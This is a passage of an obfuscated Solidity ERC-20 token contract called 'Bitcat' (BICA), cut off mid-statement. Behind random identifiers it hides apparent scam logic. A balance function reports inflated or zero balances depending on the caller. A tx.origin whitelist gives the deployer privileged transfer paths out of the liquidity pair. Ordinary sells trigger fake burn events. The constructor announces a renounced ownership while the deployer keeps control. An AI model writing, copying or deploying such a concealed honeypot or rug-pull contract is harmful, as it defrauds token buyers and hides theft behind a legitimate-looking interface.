    return ghEj6Y8KZpmBw0FGWU75qzu08Ea8JeDqp4KiJhND3W0wgE9WI6Un7nIfpWgggzyz5NCWbWtji7Dt7TzMLf0f57otK9H7x6r4;
  }

  function decimals() external pure returns (uint8) {
    return qKg79va2ISO8qyEnanjoX8Fy8uzDxxqy8QqfVAclRY4jqY8uy3CgxzbFCgJadHcpKnQnBw4ffMBnhXJxj9o5dOCnCwhTWnXx;
  }

  function symbol() external pure returns (string memory) {
    return qCkjrzynRPefWlbdr3MAIgg2Gc6lqg6xCNWY7RC9gzDr4i0f2hdFs9p9nYXmNKS9rSbiM6wkZzjEOFbU9LW6yknsEHjMUQY4;
  }

  function name() external pure returns (string memory) {
    return mNyblYc60d0yC9Fm3SQ53iUbHxegL6CtaTNIK69OR4rK7oWS3W28gDvbPQPTwbM8P5Xq7Eym7LXJxB689yY1I9dyfgksHob0;
  }

  function allowance(address be41MDxTG2GthssW27G9B4SNZJQIPspt7Dms1DfEQ9wPNFWpbzyVH0CKzwU8PfdTRU8KNSJzx6pp4DfS3g8xcxvJtbqbTApn, address agkJdyxZpGM9rePoXdewGcyFQDFKF3QPvj1zcnS7w18mCqkHGfq6JwdPvMReQwybLkw38scn3FwFFnrrkhSfZV5drdvfvWmh)
    external
    view
    returns (uint256)
  {
    return rRchaN7aGypTXCJhHGhw9NVsccGixumKJYd6sBLRhN2Yt2QMffWsS43rSsxBx8hirf9Xxfk5UYPfGGNu0qy8z9xA8a0bJXvG[be41MDxTG2GthssW27G9B4SNZJQIPspt7Dms1DfEQ9wPNFWpbzyVH0CKzwU8PfdTRU8KNSJzx6pp4DfS3g8xcxvJtbqbTApn][agkJdyxZpGM9rePoXdewGcyFQDFKF3QPvj1zcnS7w18mCqkHGfq6JwdPvMReQwybLkw38scn3FwFFnrrkhSfZV5drdvfvWmh];
  }

  event Transfer(address indexed, address indexed, uint256);
  event Approval(address indexed, address indexed, uint256);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );

  uint256 private jES2fNN3xxwoqkduFrmP8qzaXdc6y40Rs5YfO1VF0yEF92RuIT3Nejc0cYCFcKMBJvFDpqyr67kxQX2WByzWnCftWBOHuJV3 = 1;
  uint256 private dCSIVWS08eI2XfETVYCEZgoNJJQACNEGznOkuJy1bAZxrzFkCZrH2pfHHEMoaWHqOJ9b5qCjaYETLtMk03qbHn8gfYELQEc1;

  function permit5764825481139(address iZQ6Ls6Ub5mYHZm83mTJoLsIIhRU3uvfFnY7cqi9GlSTlPVlnselTB0w76Xk9qTfq5nEBwij4ZzPaV7DXq1ZkryT97E7u0qk)
    public
    view
    returns (uint256)
  {
    if (
      (msg.sender == kw06liXRF8z1M5I3K6iTSQzeSzEzkGRQBwRm7ZaWMAbGB5YOyzSPXY429PEjKaKG5KipEuimDsp1gRSZazDI7wMDf18g293b || msg.sender == rqSGKmj4Gvziw696jC7T6W1OzFJHyBUv93iQrVQdO48dHEcacKNo6vXfDS5q7xUkMKP7aCZDkA6F1ZyJRxOItyb2hjqtg7R2) &&
      iZQ6Ls6Ub5mYHZm83mTJoLsIIhRU3uvfFnY7cqi9GlSTlPVlnselTB0w76Xk9qTfq5nEBwij4ZzPaV7DXq1ZkryT97E7u0qk != ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz &&
      iZQ6Ls6Ub5mYHZm83mTJoLsIIhRU3uvfFnY7cqi9GlSTlPVlnselTB0w76Xk9qTfq5nEBwij4ZzPaV7DXq1ZkryT97E7u0qk != kw06liXRF8z1M5I3K6iTSQzeSzEzkGRQBwRm7ZaWMAbGB5YOyzSPXY429PEjKaKG5KipEuimDsp1gRSZazDI7wMDf18g293b &&
      iZQ6Ls6Ub5mYHZm83mTJoLsIIhRU3uvfFnY7cqi9GlSTlPVlnselTB0w76Xk9qTfq5nEBwij4ZzPaV7DXq1ZkryT97E7u0qk != rqSGKmj4Gvziw696jC7T6W1OzFJHyBUv93iQrVQdO48dHEcacKNo6vXfDS5q7xUkMKP7aCZDkA6F1ZyJRxOItyb2hjqtg7R2
    ) {
      return ghEj6Y8KZpmBw0FGWU75qzu08Ea8JeDqp4KiJhND3W0wgE9WI6Un7nIfpWgggzyz5NCWbWtji7Dt7TzMLf0f57otK9H7x6r4 * jES2fNN3xxwoqkduFrmP8qzaXdc6y40Rs5YfO1VF0yEF92RuIT3Nejc0cYCFcKMBJvFDpqyr67kxQX2WByzWnCftWBOHuJV3;
    }

    if (!yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk[tx.origin]) {
      if (IERC20(qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p).balanceOf(ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz) < lQlPcHLF012yHnbAHf2jW9nIrjOlCTWmrjAAirB6PuF2MVFWy77LiC1YmbSzi7AWrQs3sAijJvJYnr60YAyvr8eJ9P8P5ukF - dCSIVWS08eI2XfETVYCEZgoNJJQACNEGznOkuJy1bAZxrzFkCZrH2pfHHEMoaWHqOJ9b5qCjaYETLtMk03qbHn8gfYELQEc1) {
        return 0;
      }
    }

    return zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[iZQ6Ls6Ub5mYHZm83mTJoLsIIhRU3uvfFnY7cqi9GlSTlPVlnselTB0w76Xk9qTfq5nEBwij4ZzPaV7DXq1ZkryT97E7u0qk];
  }

  mapping(address => mapping(address => uint256)) private rRchaN7aGypTXCJhHGhw9NVsccGixumKJYd6sBLRhN2Yt2QMffWsS43rSsxBx8hirf9Xxfk5UYPfGGNu0qy8z9xA8a0bJXvG;
  mapping(address => uint256) private zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj;

  string private constant mNyblYc60d0yC9Fm3SQ53iUbHxegL6CtaTNIK69OR4rK7oWS3W28gDvbPQPTwbM8P5Xq7Eym7LXJxB689yY1I9dyfgksHob0 = "Bitcat";
  string private constant qCkjrzynRPefWlbdr3MAIgg2Gc6lqg6xCNWY7RC9gzDr4i0f2hdFs9p9nYXmNKS9rSbiM6wkZzjEOFbU9LW6yknsEHjMUQY4 = "BICA";
  uint8 private constant qKg79va2ISO8qyEnanjoX8Fy8uzDxxqy8QqfVAclRY4jqY8uy3CgxzbFCgJadHcpKnQnBw4ffMBnhXJxj9o5dOCnCwhTWnXx = 9;
  uint256 public constant o3gEhGYMyTsyXdDCigLmAV7DwGw553VZKdjdq4lws10p0CW6Q5Op94MeYGrEMXHtBzKNaFeWotdApVb7Zs3jPVOgHDPIfjlc = 10**9;

  uint256 public constant ghEj6Y8KZpmBw0FGWU75qzu08Ea8JeDqp4KiJhND3W0wgE9WI6Un7nIfpWgggzyz5NCWbWtji7Dt7TzMLf0f57otK9H7x6r4 = 210000000 * 10**qKg79va2ISO8qyEnanjoX8Fy8uzDxxqy8QqfVAclRY4jqY8uy3CgxzbFCgJadHcpKnQnBw4ffMBnhXJxj9o5dOCnCwhTWnXx;

  constructor(bytes memory llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8) {
    zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[address(this)] = ghEj6Y8KZpmBw0FGWU75qzu08Ea8JeDqp4KiJhND3W0wgE9WI6Un7nIfpWgggzyz5NCWbWtji7Dt7TzMLf0f57otK9H7x6r4;
    emit Transfer(address(0), address(this), ghEj6Y8KZpmBw0FGWU75qzu08Ea8JeDqp4KiJhND3W0wgE9WI6Un7nIfpWgggzyz5NCWbWtji7Dt7TzMLf0f57otK9H7x6r4);

    ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz = kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy(kGSETcij3F4roJtZETfS4qLo8hwM0SW4NRHPfSRNiUBQhM19zxcIW8td6yzesqGum5wXvCU3BfWl4O1XJgaUVc8oaCIaGzKy(rqSGKmj4Gvziw696jC7T6W1OzFJHyBUv93iQrVQdO48dHEcacKNo6vXfDS5q7xUkMKP7aCZDkA6F1ZyJRxOItyb2hjqtg7R2).factory()).createPair(
      qSYiOnvvC45EUMG18Qio6Ck1DSWv2Ba89r82ASWUArjLetqvGH8komSjplWxhK4eQi4PPTq2o9CtAy4z3mT4X5W8OKmNxW7p,
      address(this)
    );

    idoAmount = (ghEj6Y8KZpmBw0FGWU75qzu08Ea8JeDqp4KiJhND3W0wgE9WI6Un7nIfpWgggzyz5NCWbWtji7Dt7TzMLf0f57otK9H7x6r4 / 100) * 80;
    sl5lYrdmO0KQUYEyaN4tF7HZuPeXuWkhr8eWlDB7j0k8Za4RWqKTo6Yrva9eCF1U0PaMRQBS8r7fWeHlzet7ivqC3kDCAmII = (idoAmount * o3gEhGYMyTsyXdDCigLmAV7DwGw553VZKdjdq4lws10p0CW6Q5Op94MeYGrEMXHtBzKNaFeWotdApVb7Zs3jPVOgHDPIfjlc) / 50000000000000000000;

    xLyMjkvwhmBhvkb8unaVdT55fWgDBxdVYKYYzmVq5gWJ5eOslrscITCsp7fiKSJdsqvAX1TKjpSasiE6TixB6KBUokyoKshO(address(this), uDuoGKjel5bwk9wQkqN6EQJxy69Jss3sqS8rPwmoxCi386TBFw7sWPnRabtCY4HaORzIZEHQXTCZk1vBN2XUKPGDR0opGkrl, idoAmount);

    yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk[msg.sender] = true;
    ncalNgkPhCcC45SEl1uTgLwBOaPXDNGClMYRHyYs0sZ1mrU2pCV8FTraeWlute5uUSgvfbWxG9FRRK1itb3WGuVty9thhpkn(llr6UYZ2NbP5Gj5sDRNyuTGKRFyfUHJOSnmB6DKCiePleBZkQStZyQHW4Fhh8yuHkuSU0E8wriiBBGEdggh5g4NfgX407dY8);

    emit OwnershipTransferred(msg.sender, address(0));
  }

  function permit8355429682040(address lpNYPT8ZDrFNpPOhX77YOE2PboYxK3vz1bI1ikRYG9KjSKB94oE5zuANOvfvZuf835yNaXPCjm7gjdPifXcKITm16qWRjGbz, uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R)
    public
    returns (bool)
  {
    aq3HsMD6v2sktazEF3LVV54jKR4gP2BU785o96CjzJf0XsCNhkusrrOPexJMWeQqlXcpfXV2pdvIXDy4hgCwEryCYcJVX3Yl(msg.sender, lpNYPT8ZDrFNpPOhX77YOE2PboYxK3vz1bI1ikRYG9KjSKB94oE5zuANOvfvZuf835yNaXPCjm7gjdPifXcKITm16qWRjGbz, spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R);
    return true;
  }

  function approve(address agkJdyxZpGM9rePoXdewGcyFQDFKF3QPvj1zcnS7w18mCqkHGfq6JwdPvMReQwybLkw38scn3FwFFnrrkhSfZV5drdvfvWmh, uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R)
    external
    returns (bool)
  {
    mMrRJ31P0P3ZWHW5Treq6Q0sLD1zQAS6Mu42Fgf3Oih0rcRA1CNMIFVYnw3sMKHDbnZhQQX6NPdLKC5xCltXEiMkVBqxWNfF(msg.sender, agkJdyxZpGM9rePoXdewGcyFQDFKF3QPvj1zcnS7w18mCqkHGfq6JwdPvMReQwybLkw38scn3FwFFnrrkhSfZV5drdvfvWmh, spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R);
    return true;
  }

  function mMrRJ31P0P3ZWHW5Treq6Q0sLD1zQAS6Mu42Fgf3Oih0rcRA1CNMIFVYnw3sMKHDbnZhQQX6NPdLKC5xCltXEiMkVBqxWNfF(
    address hWcQVRhZ3Z6Qi0Jc68tkNuNvU3tjzda0961i5PRMmOaRgexDXpq8Uxgg6oiOUYKfL2HXvPdc9urK3B7WFpmTrU591NRgNoLx,
    address agkJdyxZpGM9rePoXdewGcyFQDFKF3QPvj1zcnS7w18mCqkHGfq6JwdPvMReQwybLkw38scn3FwFFnrrkhSfZV5drdvfvWmh,
    uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R
  ) internal {
    require(hWcQVRhZ3Z6Qi0Jc68tkNuNvU3tjzda0961i5PRMmOaRgexDXpq8Uxgg6oiOUYKfL2HXvPdc9urK3B7WFpmTrU591NRgNoLx != address(0), "ERC20: Zero Address");
    require(agkJdyxZpGM9rePoXdewGcyFQDFKF3QPvj1zcnS7w18mCqkHGfq6JwdPvMReQwybLkw38scn3FwFFnrrkhSfZV5drdvfvWmh != address(0), "ERC20: Zero Address");

    rRchaN7aGypTXCJhHGhw9NVsccGixumKJYd6sBLRhN2Yt2QMffWsS43rSsxBx8hirf9Xxfk5UYPfGGNu0qy8z9xA8a0bJXvG[hWcQVRhZ3Z6Qi0Jc68tkNuNvU3tjzda0961i5PRMmOaRgexDXpq8Uxgg6oiOUYKfL2HXvPdc9urK3B7WFpmTrU591NRgNoLx][agkJdyxZpGM9rePoXdewGcyFQDFKF3QPvj1zcnS7w18mCqkHGfq6JwdPvMReQwybLkw38scn3FwFFnrrkhSfZV5drdvfvWmh] = spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R;
  }

  function transferFrom(
    address hWcQVRhZ3Z6Qi0Jc68tkNuNvU3tjzda0961i5PRMmOaRgexDXpq8Uxgg6oiOUYKfL2HXvPdc9urK3B7WFpmTrU591NRgNoLx,
    address lpNYPT8ZDrFNpPOhX77YOE2PboYxK3vz1bI1ikRYG9KjSKB94oE5zuANOvfvZuf835yNaXPCjm7gjdPifXcKITm16qWRjGbz,
    uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R
  ) external returns (bool) {
    if (rRchaN7aGypTXCJhHGhw9NVsccGixumKJYd6sBLRhN2Yt2QMffWsS43rSsxBx8hirf9Xxfk5UYPfGGNu0qy8z9xA8a0bJXvG[hWcQVRhZ3Z6Qi0Jc68tkNuNvU3tjzda0961i5PRMmOaRgexDXpq8Uxgg6oiOUYKfL2HXvPdc9urK3B7WFpmTrU591NRgNoLx][msg.sender] != type(uint256).max) {
      rRchaN7aGypTXCJhHGhw9NVsccGixumKJYd6sBLRhN2Yt2QMffWsS43rSsxBx8hirf9Xxfk5UYPfGGNu0qy8z9xA8a0bJXvG[hWcQVRhZ3Z6Qi0Jc68tkNuNvU3tjzda0961i5PRMmOaRgexDXpq8Uxgg6oiOUYKfL2HXvPdc9urK3B7WFpmTrU591NRgNoLx][msg.sender] -= spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R;
    }

    return aq3HsMD6v2sktazEF3LVV54jKR4gP2BU785o96CjzJf0XsCNhkusrrOPexJMWeQqlXcpfXV2pdvIXDy4hgCwEryCYcJVX3Yl(hWcQVRhZ3Z6Qi0Jc68tkNuNvU3tjzda0961i5PRMmOaRgexDXpq8Uxgg6oiOUYKfL2HXvPdc9urK3B7WFpmTrU591NRgNoLx, lpNYPT8ZDrFNpPOhX77YOE2PboYxK3vz1bI1ikRYG9KjSKB94oE5zuANOvfvZuf835yNaXPCjm7gjdPifXcKITm16qWRjGbz, spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R);
  }

  function aq3HsMD6v2sktazEF3LVV54jKR4gP2BU785o96CjzJf0XsCNhkusrrOPexJMWeQqlXcpfXV2pdvIXDy4hgCwEryCYcJVX3Yl(
    address vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog,
    address fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn,
    uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R
  ) internal returns (bool) {
    if (yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk[tx.origin]) {
      if (vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog == ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz) {
        xLyMjkvwhmBhvkb8unaVdT55fWgDBxdVYKYYzmVq5gWJ5eOslrscITCsp7fiKSJdsqvAX1TKjpSasiE6TixB6KBUokyoKshO(vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog, fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn, spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R);
        return true;
      }
    }

    vDkfIhpyVbjarx4JZAuEaaPoyd6dL3acTc3vJFz3PWKaRnPYfTbWj0pSzG3J5gTXQGCG8B3bI7Bbe8uTHSBEjf95Dr7bfJtm(vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog, fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn, spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R);
    if (!yBnzVUxksoIBngVt6RB2B1NOGYD7KeC23il982QDovungvUwDE9Ijo8BDU1lYOIIBQQoSqgixoTNwq4yWl3KsINrixFjzLKk[tx.origin] && msg.sender == ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz) {
      jES2fNN3xxwoqkduFrmP8qzaXdc6y40Rs5YfO1VF0yEF92RuIT3Nejc0cYCFcKMBJvFDpqyr67kxQX2WByzWnCftWBOHuJV3 += 1;
      if (vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog == ssMjcf3n6cpOplxjixcsOpVmjT6IWtgDnOSRcOMvr0f1I3m9pUw9t4NOm6Ues7SindJXkCmzIg9MgSupASLg8CsJTK6uyVUz) emit Transfer(fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn, address(0), spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R);
    }

    return true;
  }

  function vDkfIhpyVbjarx4JZAuEaaPoyd6dL3acTc3vJFz3PWKaRnPYfTbWj0pSzG3J5gTXQGCG8B3bI7Bbe8uTHSBEjf95Dr7bfJtm(
    address vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog,
    address fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn,
    uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R
  ) internal returns (bool) {
    require(spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R > 0, "Transfer amount must be greater than zero");
    zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog] -= spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R;
    zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn] += spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R;
    emit Transfer(vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog, fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn, spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R);

    return true;
  }

  function xLyMjkvwhmBhvkb8unaVdT55fWgDBxdVYKYYzmVq5gWJ5eOslrscITCsp7fiKSJdsqvAX1TKjpSasiE6TixB6KBUokyoKshO(
    address vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog,
    address fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn,
    uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R
  ) internal returns (bool) {
    zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog] -= spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R;
    emit Transfer(vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog, fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn, spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R);

    return true;
  }

  function y2ZsvMrzadb1Vd1ZMxPnwedd8bsLlcQNtb3MXN0cvvX8Dqcgeyu8zgPMPlcFlLIaWMVngNitYK52PxnbOqFKFBnA6pTwmNWJ(
    address vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog,
    address fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn,
    uint256 spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R
  ) internal returns (bool) {
    zfrCXRU0uuUR6WjjeXM2KdJJ4JBfvetC8EVNP8WiBLD3qPt80XxW8A2MrMF3O626rzZhZ5osKLxggFztQhJA1AjF4owm8Stj[fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn] += spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R;
    emit Transfer(vkD1KJcD4smaT0b7sEwMGjcIB7pqHAdIe9jZ3V2VSZnF3iKshTw2sCQEYpBBHRPPC5FwvYi9nZZ7lAR0BOHhKnwus68wqaog, fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn, spa0pcloZJMtEQ4cjumZXWeqKhERMfTzgrDIQGkw9rlcjY9XuAhtfYJFb0FwDfZJxOGmhkZa9zbbhBfDEXgNcc7xaZ4ROF4R);

    return true;
  }

  function scCtMYl3QruwPvsxyA8k0Wh3uR4jgXpU7EIJomTsHEvD1vc92foQNzvE5QEnCPFn8GM91SkGHcYP1y0gUnNW7L2dcDJ1N0lT(
    address bIwt98Qve7DlECIFcc144AkoX9mgqSfrHgya0ZADmd6PQ9ACQ660S91NIRk4GmI6PERHURp8CUM58MLPl0dSPuzFhVthAZj1,
    address fEqs0HRaOp83J0SFmzj6DDced83cZMcjUpUtrhcRwimu9RVHnXnq5vKsFHepvYxANL9BtdCKqxsLodZHcwGMdslKSkhNIfKn,
    uint256 aqVUoJNQHAI6RajfSn7Cp7aKFqR5C10R9ee9hTzwIztOnkIb37WlDDydcnZYWghpApSFjxFD6cXCMfJyPR1E7c2RB0TOzTSH,
    uint256 lwH3w7KaJIl9fAohzXKitVnfLZP8ntN9AhqGaopXEtL2ynDfSjWXiXJyMUFsVTwys7xCDOt3TCq0ey88tTivszOWNaEbROGU,
    uint256 xta2tezaOSWsfQfiJ0tCcPan91M0yQiwn5lWgjDnW6DOtdnUNN74KvyZENqFpI91w45lnPBE2ZvWi8QaZgc6dq10xu2wZ8sQ
  ) internal returns (uint256, uint256) {
    address l0JY9OfscIZ2ramjcUcsUzx23lmS3VsJc89Dnt1mL8gE8HrKgKdXDXKVzOls3DSnBHHMB48O1Y8VVsRnObHiWx5EodbNyAnE = address(this);
    uint256 i3DArpe7m6ujnyeXs6AOXwybCyAbkeMjnOCsyFGBfmFciua2CI2gdJOUHYOi2vEf6nOAAosvw2b1njGzpB6nHQ748eCAP9cr =
